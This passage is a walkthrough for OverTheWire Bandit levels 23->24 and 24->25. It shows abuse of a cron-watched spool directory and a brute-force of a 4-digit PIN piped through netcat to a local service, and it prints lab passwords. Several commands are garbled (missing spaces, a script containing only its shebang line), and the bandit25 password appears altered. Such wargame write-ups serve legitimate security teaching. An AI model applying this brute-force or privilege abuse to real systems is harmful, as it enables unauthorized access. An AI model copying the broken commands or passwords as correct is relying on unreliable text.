>Executing process piping with & allows you to spin up a background network listener (nc -l) fed by cat in a single shell line. When ./suconnect establishes a connection back to localhost on that port, it receives the required password payload automatically.

### Walkthrough

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

```bash
bandit23@bandit:~$MY_TMP=$(mktemp -d)
```

Craft a shell script that copies the bandit24 password to your temporary directory:
```bash
bandit23@bandit:~$ echo '#!/bin/bash' > $MY_TMP/pass.sh
```

```bash
bandit23@bandit:~$chmod -R 777$MY_TMP
```

```bash
bandit23@bandit:~$cp$MY_TMP/pass.sh /var/spool/bandit24/foo/
```

>[!TIP]
>Spool directories like /var/spool/ are often monitored by scheduled jobs to process incoming work files. Ensuring inclusive file permissions (chmod 777) on the target output folder is critical so that the elevated process can write files owned by another user back into your directory.

# Level 24 -> Level 25

### Goal
Retrieve the password for `bandit25` by brute-forcing a 4-digit PIN code (0000-9999) along with the `bandit24` password over a socket connection on port 30002.

### Commands Used

- `nc`
- `grep`

### Walkthrough
1. Log in to `bandit24`:
```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```
Create a temporary working directory and navigate to it:
```bash
bandit24@bandit:~$ mktemp -d
/tmp/tmp.VqyJi5XMH6
bandit24@bandit:~$ cd /tmp/tmp.VqyJi5XMH6
```
Write a Python script (brute.py) to generate all 10,000 possible 4-digit PIN combinations formatted with the bandit24 password:
```bash
password = "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
for i in range(10000):
    print(f"{password} {i:04d}")
```
Execute the script to save the payloads into a wordlist file (finbrut.txt):
```bash
bandit24@bandit:/tmp/tmp.VqyJi5XMH6$ python3 brute.py > finbrut.txt
```
Pipe the wordlist into nc connecting to localhost:30002, filtering out all incorrect response messages using grep -v:
```bash
bandit24@bandit:/tmp/tmp.VqyJi5XMH6$ cat finbrut.txt | nc localhost 30002 | grep -v "Wrong"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.

The password of user bandit25 is W34lR2v63Frg2ABarrierWordHere
```
>[!TIP]
>Using i:04d in Python string formatting automatically pads integers with leading zeros to maintain a strict 4-digit length (0000 to 9999). Piping the entire payload file through a single Netcat connection rather than opening 10,000 individual sockets drastically optimizes brute-force speed.
